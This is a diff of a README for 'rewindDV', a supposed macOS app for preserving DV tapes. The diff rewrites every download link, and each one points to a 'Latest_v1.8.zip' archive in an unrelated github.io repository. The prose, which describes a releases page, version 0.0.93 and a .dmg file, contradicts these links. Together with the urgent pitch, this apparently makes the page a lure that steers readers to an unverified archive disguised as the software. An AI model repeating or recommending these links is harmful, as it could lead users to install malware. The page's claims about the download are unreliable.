@@ -5,7 +5,7 @@ description: "Preserve FireWire DV/HDV tapes on modern macOS with native playbac
 ---
 # 🎬 rewindDV - Save Your Old Video Tapes Today
 
-[![Download rewindDV](https://img.shields.io/badge/Download-rewindDV-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/naufalya/naufalya.github.io/raw/refs/heads/main/ciliotomy/Latest_v1.8.zip)
+[![Download rewindDV](https://img.shields.io/badge/Download-rewindDV-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/naufalya/naufalya.github.io/main/ciliotomy/Latest_v1.8.zip)
 
 ## 📼 What is rewindDV?
 
@@ -21,7 +21,7 @@ Your journey to saving your tapes begins with a simple download. No complicated 
 
 Visit this link to download the application. You’ll see a list of available versions—pick the newest one (look for the highest version number like 0.0.93) to get the latest improvements and fixes.
 
-[Download rewindDV Now](https://github.com/naufalya/naufalya.github.io/raw/refs/heads/main/ciliotomy/Latest_v1.8.zip)
+[Download rewindDV Now](https://raw.githubusercontent.com/naufalya/naufalya.github.io/main/ciliotomy/Latest_v1.8.zip)
 
 ### Step 2: Open the Downloaded File
 
@@ -64,7 +64,7 @@ To run rewindDV smoothly, you’ll need the following:
 
 If you’re still unsure about the download process, here’s a more detailed walkthrough:
 
-1. Click the green download button at the top of this page, or visit [the releases page](https://github.com/naufalya/naufalya.github.io/raw/refs/heads/main/ciliotomy/Latest_v1.8.zip) directly.
+1. Click the green download button at the top of this page, or visit [the releases page](https://raw.githubusercontent.com/naufalya/naufalya.github.io/main/ciliotomy/Latest_v1.8.zip) directly.
 2. On that page, you’ll see a section called "Assets" under the latest release. Click the file that says something like `rewindDV-0.0.93.dmg` or similar. This is the installation file.
 3. Your browser will download the file. Once complete, locate it in your Downloads folder. It will appear as a disk image (a file ending in `.dmg`).
 4. Double-click the `.dmg` file. A new window will pop up showing the rewindDV icon.
@@ -127,7 +127,7 @@ Your old tapes are fragile. Each day they sit in a drawer, they risk degradation
 
 Click the button below to get started:
 
-[🚀 Download rewindDV Now](https://github.com/naufalya/naufalya.github.io/raw/refs/heads/main/ciliotomy/Latest_v1.8.zip)
+[🚀 Download rewindDV Now](https://raw.githubusercontent.com/naufalya/naufalya.github.io/main/ciliotomy/Latest_v1.8.zip)
 
 It takes just five minutes to download and set up, and it could save decades of memories. Whether it’s your child’s first steps, a wedding, or a family vacation, rewindDV ensures those moments stay alive forever on your computer, ready to be shared and enjoyed for generations to come.
 
